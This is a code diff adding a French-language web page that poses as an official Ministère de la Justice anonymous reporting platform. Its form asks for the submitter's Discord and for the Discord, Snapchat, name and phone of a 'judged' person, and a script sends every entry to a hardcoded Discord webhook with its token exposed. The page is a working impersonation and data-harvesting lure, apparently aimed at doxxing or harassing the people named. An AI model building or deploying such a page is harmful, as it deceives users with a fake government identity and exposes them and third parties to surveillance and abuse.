@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Ministère de la Justice - Signalement</title>
+<style>
+  body {
+    margin: 0;
+    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+    background-color: #f8f9fa;
+    color: #222;
+  }
+
+  header {
+    background-color: #002654;
+    color: white;
+    padding: 1.5rem 1rem;
+    text-align: center;
+    box-shadow: 0 2px 8px rgb(0 0 0 / 0.1);
+  }
+
+  header h1 {
+    margin: 0;
+    font-weight: 700;
+    font-size: 1.8rem;
+  }
+
+  header p {
+    margin: 0.25rem 0 0;
+    font-size: 1rem;
+    font-weight: 400;
+    font-style: italic;
+    opacity: 0.8;
+  }
+
+  main {
+    max-width: 600px;
+    background-color: white;
+    margin: 2rem auto;
+    padding: 2rem;
+    border-radius: 6px;
+    box-shadow: 0 4px 10px rgb(0 0 0 / 0.1);
+  }
+
+  h2 {
+    color: #002654;
+    margin-bottom: 1rem;
+    font-weight: 600;
+  }
+
+  label {
+    font-weight: 600;
+    margin-top: 1em;
+    display: block;
+  }
+
+  input, textarea {
+    width: 100%;
+    padding: 10px;
+    margin-top: 6px;
+    border: 1px solid #ccc;
+    border-radius: 4px;
+    font-size: 1rem;
+    box-sizing: border-box;
+  }
+
+  textarea {
+    resize: vertical;
+  }
+
+  button {
+    margin-top: 20px;
+    padding: 12px 20px;
+    background-color: #002654;
+    color: white;
+    border: none;
+    font-size: 1.1rem;
+    border-radius: 4px;
+    cursor: pointer;
+    transition: background-color 0.3s ease;
+  }
+
+  button:hover {
+    background-color: #001d40;
+  }
+
+  footer {
+    text-align: center;
+    font-size: 0.9rem;
+    color: #666;
+    margin: 3rem 0 1rem;
+  }
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Ministère de la Justice</h1>
+  <p>Plateforme officielle de signalement anonyme</p>
+</header>
+
+<main>
+  <section>
+    <h2>Déposer un signalement</h2>
+    <form id="signalementForm" autocomplete="off">
+      <label for="yourDiscord">Votre Discord *</label>
+      <input type="text" id="yourDiscord" name="yourDiscord" required />
+
+      <label for="targetDiscord">Discord de la personne jugée *</label>
+      <input type="text" id="targetDiscord" name="targetDiscord" required />
+
+      <label for="targetSnap">Snapchat de la personne jugée</label>
+      <input type="text" id="targetSnap" name="targetSnap" />
+
+      <label for="details">Informations complémentaires *</label>
+      <textarea id="details" name="details" rows="6" required></textarea>
+
+      <button type="submit">Transmettre le signalement</button>
+    </form>
+  </section>
+</main>
+
+<footer>
+  © Ministère de la Justice - Tous droits réservés
+</footer>
+
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1403111934366187542/ppVxwNfXk-kf73zn0vdvdaycJ4e6XmIATIrrZPAOwn9i5uzwTse5glCqI-1fKyeyIe2c"; // Remplace par ton webhook Discord
+
+  document.getElementById('signalementForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const form = e.target;
+
+    const payload = {
+      embeds: [{
+        title: "⚖️ Nouveau signalement anonyme reçu",
+        color: 0x002654,
+        fields: [
+          {
+            name: "👤 Discord de la victime",
+            value: form.yourDiscord.value || "N/A",
+            inline: false
+          },
+          {
+            name: "🕵️ Discord de la personne jugée",
+            value: form.targetDiscord.value || "N/A",
+            inline: false
+          },
+          {
+            name: "📸 Snapchat de la personne jugée",
+            value: form.targetSnap.value || "N/A",
+            inline: false
+          },
+          {
+            name: "📝 autre (nom prenom num, ou meme raison)",
+            value: form.details.value || "N/A",
+            inline: false
+          }
+        ],
+        footer: {
+          text: "Ministère de la Justice"
+        },
+        timestamp: new Date().toISOString()
+      }]
+    };
+
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(payload)
+    })
+    .then(() => {
+      alert("Signalement envoyé avec succès.");
+      form.reset();
+    })
+    .catch(err => {
+      alert("Erreur lors de l'envoi. Veuillez réessayer plus tard.");
+      console.error(err);
+    });
+  });
+</script>
+
+</body>
+</html>
